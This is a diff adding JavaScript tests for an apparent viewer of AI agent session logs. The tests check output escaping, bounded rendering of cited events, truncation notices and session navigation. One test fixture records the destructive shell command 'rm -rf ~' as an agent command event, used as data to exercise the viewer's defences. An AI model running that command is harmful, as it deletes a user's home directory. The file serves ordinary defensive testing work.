+    var recs = [ exEv({ event_type:"command.exec", event_id:"c0", tool_call_id:"C", command:"rm -rf ~" }) ];
+    for(var i=0;i<12;i++) recs.push(exEv({ event_type:"message.assistant", event_id:"m"+i, tool_call_id:"C" }));
+    recs.push(exEv({ event_type:"command.result", event_id:"cr", tool_call_id:"C", tags:["tool_error"] }));
+    var t = explain(recs[0], buildIndex(recs)).next.text;
+    ok("a truncated key says the counterpart may be wrong",
+       /More records share it than this viewer indexes/.test(t), t);
+  })();
+  ok("a hostile record still explains itself", !!e.what.length);
+  ok("a hostile record's citation still resolves", e.findings.length === 1);
+
+  // And the renderer must put every one of those strings through esc().
+  var src = HTML.slice(HTML.indexOf("function exRender"), HTML.indexOf("function exRender") + 4000);
+  ok("exRender() exists", HTML.indexOf("function exRender") !== -1);
+  ok("exRender() interpolates nothing without esc()",
+     !/\+\s*(?:ex\.|e\.|x\.)?(?:what|text|title|rule|finding|sev|label)\b(?!\s*\))/.test(
+       src.replace(/esc\([^)]*\)/g, "ESC")),
+     "every explain() string must reach the pane through esc()");
+})();
+
+/* — the citation render loop is bounded — */
+(function(){
+  // Driven straight off record content. Unbounded, a finding citing 2,000,000
+  // events froze Chrome for over a minute on every selection.
+  var m = HTML.match(/cited events · [\s\S]{0,900}?Showing the first/);
+  ok("showDetail caps how many cited events it renders",
+     m !== null && /c<CITECAP/.test(m[0]),
+     "the cited_event_ids render loop must be bounded and say so");
+  ok("the cap is stated to the operator, not applied silently",
+     /Showing the first[\s\S]{0,120}cited events/.test(HTML));
+})();
+
+/* — the pane keeps its session context when a record is selected — */
+(function(){
+  // Filtering to a session and clicking a row used to discard the rollup with
+  // no way back except a button inside whichever record was clicked.
+  ok("showDetail offers a return to the session summary",
+     /id="backSess"/.test(HTML),
+     "a record selected inside a lone-session view must offer a way back to the rollup");
+})();
 
 /* ── report ─────────────────────────────────────────────────────────────── */
 
